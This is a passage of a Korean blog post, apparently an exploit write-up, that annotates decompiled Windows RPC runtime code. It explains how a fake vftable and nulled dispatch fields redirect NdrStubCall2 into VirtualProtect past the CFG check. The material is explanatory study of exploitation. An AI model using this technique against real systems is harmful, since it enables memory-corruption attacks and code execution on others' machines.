      v27 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; (__fastcall **)(LRPC_SCALL *, &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;))(*(_QWORD *)v26 + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;i64);
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v27 == LRPC_SCALL::CleanupSystemHandles )
        LODWORD(v25) = LRPC_SCALL::CleanupSystemHandles(v26, &lt;span class=&#34;hljs-number&#34;&gt;5u&lt;/span&gt;);
      &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
        LODWORD(v25) = v27(v26, &lt;span class=&#34;hljs-number&#34;&gt;5u&lt;/span&gt;);
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (_DWORD)v25 )
        RpcRaiseException(&lt;span class=&#34;hljs-number&#34;&gt;1783&lt;/span&gt;);
    }
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v25;
}&lt;/code&gt;&lt;/pre&gt;&lt;br&gt;&lt;code&gt;RpcMsg&lt;/code&gt;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB294; &amp;#xC6D0;&amp;#xB798; &lt;code&gt;VideoDirtListener&lt;/code&gt;&amp;#xC774;&amp;#xACE0; &lt;code&gt;Handle&lt;/code&gt;&amp;#xC758; &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC778; 0&amp;#xC5D0;&amp;#xB294; &amp;#xAC00;&amp;#xC9DC; vftable&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &lt;code&gt;v26&lt;/code&gt;&amp;#xC740; &amp;#xC774; &amp;#xAC00;&amp;#xC9DC; vftable&amp;#xC758; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC5D4;&amp;#xD2B8;&amp;#xB9AC;&amp;#xC758; &amp;#xAC12;&amp;#xC744; &amp;#xAC00;&amp;#xC9C0;&amp;#xAC8C; &amp;#xB418;&amp;#xACE0; &amp;#xC5EC;&amp;#xAE30;&amp;#xC5D0; 0x100&amp;#xC744; &amp;#xB354;&amp;#xD55C; &amp;#xC8FC;&amp;#xC18C;&amp;#xC758; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; &amp;#xAC12;&amp;#xC774; 0&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xB77C;&amp;#xBA74; &amp;#xC774;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xACE0; &amp;#xB610;&amp;#xD55C; &amp;#xBC18;&amp;#xD658; &amp;#xAC12;&amp;#xC774; 0&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xBA74; &amp;#xC608;&amp;#xC678;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB0E5; &amp;#xAC00;&amp;#xC9DC; vftable&amp;#xC758; &amp;#xCCAB; &amp;#xC5D4;&amp;#xD2B8;&amp;#xB9AC;&amp;#xB97C; 0&amp;#xC73C;&amp;#xB85C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5B4;&amp;#xC8FC;&amp;#xBA74; if &amp;#xBB38;&amp;#xC73C;&amp;#xB85C; &amp;#xC9C4;&amp;#xC785;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC544;&amp;#xC11C; &amp;#xBC14;&amp;#xB85C; &amp;#xB9AC;&amp;#xD134;&amp;#xD558;&amp;#xB294;&amp;#xAC70; &amp;#xC544;&amp;#xB2C8;&amp;#xB0D0;&amp;#xACE0;&amp;#xC694;? &amp;#xC774; &amp;#xBD80;&amp;#xBD84;&amp;#xC774; &lt;code&gt;NdrStubCall2&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xB610; &amp;#xCC38;&amp;#xC870;&amp;#xB418;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; 0&amp;#xC73C;&amp;#xB85C; &amp;#xB9CC;&amp;#xB4E4; &amp;#xC218;&amp;#xAC00; &amp;#xC5C6;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4; &amp;#x3160;&amp;#x3160; &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xC774; &amp;#xBD80;&amp;#xBD84;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &lt;code&gt;VirtualProtect&lt;/code&gt;&amp;#xB85C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;VirtualProtect&lt;/code&gt;&amp;#xB294; &amp;#xC798;&amp;#xBABB;&amp;#xB41C; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xAC70;&amp;#xB098; &amp;#xD558;&amp;#xB294; &amp;#xB4F1;&amp;#xC758; &amp;#xC774;&amp;#xC720;&amp;#xB85C; &amp;#xB3D9;&amp;#xC791;&amp;#xC774; &amp;#xC2E4;&amp;#xD328;&amp;#xD588;&amp;#xC744; &amp;#xB54C; 0&amp;#xC744; &amp;#xBC18;&amp;#xD658;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xD574;&amp;#xB2F9; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xC608;&amp;#xC678; &amp;#xC5C6;&amp;#xC774; &amp;#xC798; &amp;#xD1B5;&amp;#xACFC;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;&amp;#xBB34;&amp;#xD2BC; &amp;#xC774;&amp;#xB807;&amp;#xAC8C; &lt;code&gt;RpcMsg-&amp;gt;Buffer&lt;/code&gt;&amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB420; &amp;#xC778;&amp;#xC790;&amp;#xB4E4;&amp;#xC774; &lt;code&gt;NdrStubCall2&lt;/code&gt;&amp;#xC758; &lt;code&gt;arg&lt;/code&gt;&amp;#xAC00; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC73C;&amp;#xB85C; &amp;#xBAA8;&amp;#xB450; &amp;#xBCF5;&amp;#xC0AC;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;! &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xB300;&amp;#xB9DD;&amp;#xC758; &lt;code&gt;Invoke&lt;/code&gt;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xC640; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB420; &amp;#xC778;&amp;#xC790;&amp;#xB4E4;&amp;#xC774; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; &amp;#xBC84;&amp;#xD37C;&amp;#xB97C; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;h3 id=&#34;Invoke&#34;&gt;&lt;a href=&#34;#Invoke&#34; class=&#34;headerlink&#34; title=&#34;Invoke&#34;&gt;&lt;/a&gt;&lt;code&gt;Invoke&lt;/code&gt;&lt;/h3&gt;&lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xB294; &lt;code&gt;NdrStubCall2&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;Invoke&lt;/code&gt;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;v21 = MIDL2-&amp;gt;ThunkTable;
&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v21 &amp;amp;&amp;amp; (v58 = (&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; (__fastcall *)(_MIDL_STUB_MESSAGE *, &lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; STUB_THUNK *, __int64))v21[ProcNum2]) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64 )
{
  v58(&amp;amp;pStubMsg, v21, ProcNum2);
}
&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
{
  v105 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
  v22 = (&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; SERVER_ROUTINE *)Msg-&amp;gt;ManagerEpv;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v22 )
    v22 = DispatchTable;
  argc = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64)NdrProcContext.StackSize &amp;gt;&amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (_DWORD)argc &amp;amp;&amp;amp; (*(_BYTE *)(NdrProcContext.&lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt;.NdrInfo.pProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; (v20 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
    LODWORD(argc) = argc - &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v7 )
    v24 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 *)(v7 + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;);
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    v24 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
  v25 = Invoke((__int64 (__fastcall *)(__int64, __int64, __int64, __int64))v22[ProcNum2], args, v24, argc);
  v105 = v25;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (*(_BYTE *)(NdrProcContext.&lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt;.NdrInfo.pProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
  {
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (NdrProcContext.Flags &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
      *(_QWORD *)&amp;amp;args[&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; * (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)argc] = v25;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( pThis )
      (*((&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; (__fastcall **)(PRPC_MESSAGE, _QWORD, _QWORD))pNdrOleExtensionsTable + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;))(
        Msg,
        &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64,
        (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v25);
  }
}&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;MIDL_SERVER_INFO&lt;/code&gt;&amp;#xC758; &lt;code&gt;ThunkTable&lt;/code&gt;&amp;#xC774; NULL&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xBA74; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &lt;code&gt;StubMsg&lt;/code&gt;, &lt;code&gt;ThunkTable&lt;/code&gt;, &lt;code&gt;ProcNum&lt;/code&gt;&amp;#xAC00; &amp;#xC804;&amp;#xB2EC;&amp;#xB418;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &lt;code&gt;ThunkTable&lt;/code&gt;&amp;#xC740; NULL&amp;#xB85C; &amp;#xC124;&amp;#xC815;&amp;#xD574;&amp;#xC57C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB610;&amp;#xD55C; &lt;code&gt;RpcMsg&lt;/code&gt;&amp;#xC758; &lt;code&gt;ManagerEpv&lt;/code&gt;&amp;#xB3C4; NULL&amp;#xC774;&amp;#xBA74; &lt;code&gt;MIDL_SERVER_INFO&lt;/code&gt;&amp;#xC758; &lt;code&gt;DispatchTable&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xAC00;&amp;#xC838;&amp;#xC635;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;code&gt;Invoke&lt;/code&gt;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xBCF4;&amp;#xBA74; &lt;code&gt;v22[ProcNum]&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xC640; &amp;#xC778;&amp;#xC790;&amp;#xB4E4;&amp;#xC774; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; &amp;#xBC84;&amp;#xD37C;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;, &amp;#xC778;&amp;#xC790;&amp;#xC758; &amp;#xC218;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD574;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xACE0; &amp;#xC788;&amp;#xB124;&amp;#xC694;! &lt;code&gt;Invoke&lt;/code&gt; &amp;#xB0B4;&amp;#xBD80;&amp;#xC5D0;&amp;#xC120; &amp;#xC5B4;&amp;#xB5A4; &amp;#xB3D9;&amp;#xC791;&amp;#xC774; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C8;&amp;#xAE4C;&amp;#xC694;?&amp;#x2026;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;__int64 __fastcall &lt;span class=&#34;hljs-title&#34;&gt;Invoke&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(__int64 (__fastcall *a1)(__int64, __int64, __int64, __int64), &lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *args, __int64 a3, &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; argc)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *v4; &lt;span class=&#34;hljs-comment&#34;&gt;// rsp&lt;/span&gt;
  __int64 vars0[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;]; &lt;span class=&#34;hljs-comment&#34;&gt;// [rsp+0h] [rbp+0h] BYREF&lt;/span&gt;

  v4 = alloca(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; * ((argc + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFFFFE&lt;/span&gt;));
  qmemcpy(vars0, args, &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;i64 * argc);
  RpcInvokeCheckICall(a1);
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; a1(vars0[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;], vars0[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;], vars0[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;], vars0[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;]);
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC624;&amp;#xB79C;&amp;#xB9CC;&amp;#xC5D0; &amp;#xC9E7;&amp;#xC740; &amp;#xBD84;&amp;#xB7C9;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xBCF4;&amp;#xB2C8; &amp;#xAE30;&amp;#xBD84;&amp;#xC774; &amp;#xB9E4;&amp;#xC6B0; &amp;#xC88B;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!! &amp;#xC778;&amp;#xC790; &amp;#xC804;&amp;#xB2EC;&amp;#xC5D0; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xB9CC;&amp;#xD07C;&amp;#xC758; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC744; &lt;code&gt;alloca&lt;/code&gt;&amp;#xB85C; &amp;#xCD94;&amp;#xAC00;&amp;#xB85C; &amp;#xD655;&amp;#xC7A5;&amp;#xD55C; &amp;#xB2E4;&amp;#xC74C; &lt;code&gt;qmemcpy&lt;/code&gt;&amp;#xB85C; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; &lt;code&gt;RpcInvokeCheckICall&lt;/code&gt;&amp;#xB85C; CFG &amp;#xAC80;&amp;#xC0AC;&amp;#xB97C; &amp;#xC218;&amp;#xD589;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xAC80;&amp;#xC0AC;&amp;#xB97C; &amp;#xD1B5;&amp;#xACFC;&amp;#xD558;&amp;#xBA74; &lt;del&gt;&amp;#xB4DC;&amp;#xB514;&amp;#xC5B4;&lt;/del&gt; &amp;#xC694;&amp;#xCCAD;&amp;#xB41C; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;Exit&#34;&gt;&lt;a href=&#34;#Exit&#34; class=&#34;headerlink&#34; title=&#34;Exit&#34;&gt;&lt;/a&gt;Exit&lt;/h3&gt;&lt;p&gt;&amp;#xC694;&amp;#xCCAD;&amp;#xB41C; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB410;&amp;#xB2E4;&amp;#xACE0; &amp;#xB05D;&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xC8E0;! &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; &amp;#xBAA9;&amp;#xD45C;&amp;#xB294; &lt;code&gt;NdrStubCall2&lt;/code&gt;&amp;#xB97C; &lt;del&gt;&amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xB97C; &amp;#xB9DE;&amp;#xC9C0; &amp;#xC54A;&amp;#xACE0;&lt;/del&gt; &amp;#xC608;&amp;#xC678; &amp;#xC5C6;&amp;#xC774; &amp;#xB9AC;&amp;#xD134;&amp;#xC2DC;&amp;#xCF1C;&amp;#xC918;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;code&gt;NdrStubCall2&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;Invoke&lt;/code&gt;&amp;#xAC00; &amp;#xB9AC;&amp;#xD134;&amp;#xD55C; &amp;#xD6C4; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC740; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xB294;&amp;#xB370;&amp;#xC694;?&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !pChannel )
  {
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( pStubMsg.IsClient )
    {
      pStubMsg.SavedHandle = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      pStubMsg.RpcMsg-&amp;gt;Handle = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
    }
    pStubMsg.RpcMsg-&amp;gt;BufferLength = (v26 + &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFFFFC&lt;/span&gt;;
    RpcMsg1 = pStubMsg.RpcMsg;
    v98 = pStubMsg.RpcMsg;
    v122 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
    v28 = (BINDING_HANDLE *)pStubMsg.RpcMsg-&amp;gt;Handle;&lt;span class=&#34;hljs-comment&#34;&gt;//v28 == fake vftable&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( pStubMsg.RpcMsg-&amp;gt;Handle
      &amp;amp;&amp;amp; *((_DWORD *)v28 + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) == &lt;span class=&#34;hljs-number&#34;&gt;0x89ABCDEF&lt;/span&gt;
      &amp;amp;&amp;amp; (v29 = *((_DWORD *)v28 + &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;), (v29 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x33307C&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) )
    {
      v116 = pStubMsg.RpcMsg-&amp;gt;Handle;
      v30 = v29 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x202048&lt;/span&gt;;
      v96 = v30;
      v101 = pStubMsg.RpcMsg;
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v30 &amp;amp;&amp;amp; (pStubMsg.RpcMsg-&amp;gt;RpcInterfaceInformation-&amp;gt;Flags &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x2000000&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
      {
        v34 = (*(__int64 (__fastcall **)(BINDING_HANDLE *, PRPC_MESSAGE, _QWORD))(*(_QWORD *)v28 + &lt;span class=&#34;hljs-number&#34;&gt;0x70&lt;/span&gt;i64))(
                v28,
                pStubMsg.RpcMsg,
                &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64);
        &lt;span class=&#34;hljs-keyword&#34;&gt;goto&lt;/span&gt; LABEL_56;
      }
      v31 = (__int64)NtCurrentTeb()-&amp;gt;ReservedForNtRpc;
      v115 = v31;
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v31 )
      {
        v32 = (struct THREAD *)(v31 ^ &lt;span class=&#34;hljs-number&#34;&gt;0xABABABABDEDEDEDE&lt;/span&gt;ui64);
        v115 = (__int64)v32;
        v123 = NtCurrentTeb();
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (HANDLE)*((_QWORD *)v32 + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) != v123-&amp;gt;ClientId.UniqueThread )
          __fastfail(&lt;span class=&#34;hljs-number&#34;&gt;0x1E&lt;/span&gt;u);
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v32 )
          &lt;span class=&#34;hljs-keyword&#34;&gt;goto&lt;/span&gt; LABEL_217;
      }
      v32 = ThreadSelfHelper();
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v32 )
      {
LABEL_217:
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *((_QWORD *)v32 + &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;) )
        {
          FreeEEInfoChain();
          *((_QWORD *)v32 + &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;) = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
        }
        RpcMsg1-&amp;gt;ProcNum &amp;amp;= &lt;span class=&#34;hljs-number&#34;&gt;0xFFFF7FFF&lt;/span&gt;;
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v30 )                             &lt;span class=&#34;hljs-comment&#34;&gt;// !v30 =&amp;gt; 0&lt;/span&gt;
        {
          &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (*((_DWORD *)v28 + &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x130010&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; (Microsoft_Windows_RPCEnableBits &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )&lt;span class=&#34;hljs-comment&#34;&gt;// avoid here&lt;/span&gt;
          {
            v59 = BINDING_HANDLE::GetImpersonationLevel(v28);
            v60 = BINDING_HANDLE::GetAuthenticationService(v28);
            v61 = BINDING_HANDLE::GetAuthenticationLevel(v28);
            v62 = (*(__int64 (__fastcall **)(BINDING_HANDLE *))(*(_QWORD *)v28 + &lt;span class=&#34;hljs-number&#34;&gt;344&lt;/span&gt;i64))(v28);
            v63 = (*(__int64 (__fastcall **)(BINDING_HANDLE *))(*(_QWORD *)v28 + &lt;span class=&#34;hljs-number&#34;&gt;336&lt;/span&gt;i64))(v28);
            v64 = (*(__int64 (__fastcall **)(BINDING_HANDLE *))(*(_QWORD *)v28 + &lt;span class=&#34;hljs-number&#34;&gt;328&lt;/span&gt;i64))(v28);
            v65 = (*(__int64 (__fastcall **)(BINDING_HANDLE *))(*(_QWORD *)v28 + &lt;span class=&#34;hljs-number&#34;&gt;320&lt;/span&gt;i64))(v28);
            v94 = v62;
            RpcMsg1 = v98;
            McTemplateU0jqqzzzqqq(
              v66,
              (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;RpcClientCallStartEvent,
              &amp;amp;v101-&amp;gt;RpcInterfaceInformation-&amp;gt;InterfaceId,
              v98-&amp;gt;ProcNum,
              v65,
              v64,
              v63,
              v94,
              v61,
              v60,
              v59);
            v30 = v96;
          }
          v36 = (*(__int64 (__fastcall **)(BINDING_HANDLE *, PRPC_MESSAGE))(*(_QWORD *)v28 + &lt;span class=&#34;hljs-number&#34;&gt;0x68&lt;/span&gt;i64))(v28, RpcMsg1);&lt;span class=&#34;hljs-comment&#34;&gt;// make corrupted vftable[0] + 0x68 points VirtualProtect in DispatchTable&lt;/span&gt;
          &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v36 )
            &lt;span class=&#34;hljs-keyword&#34;&gt;goto&lt;/span&gt; LABEL_57;
          v28 = (BINDING_HANDLE *)RpcMsg1-&amp;gt;Handle;
          v116 = RpcMsg1-&amp;gt;Handle;
        }
        v33 = *(__int64 (__fastcall **)(OSF_SCALL *__hidden, struct _RPC_MESSAGE *, struct _GUID *))(*(_QWORD *)v28 + &lt;span class=&#34;hljs-number&#34;&gt;0x70&lt;/span&gt;i64);&lt;span class=&#34;hljs-comment&#34;&gt;// call RpcMsg-&amp;gt;Handle[0] + 0x70 =&amp;gt; VirtualProtect&lt;/span&gt;
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v33 == OSF_SCALL::GetBuffer )
        {
          v34 = OSF_SCALL::GetBuffer(v28, RpcMsg1, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64);
        }
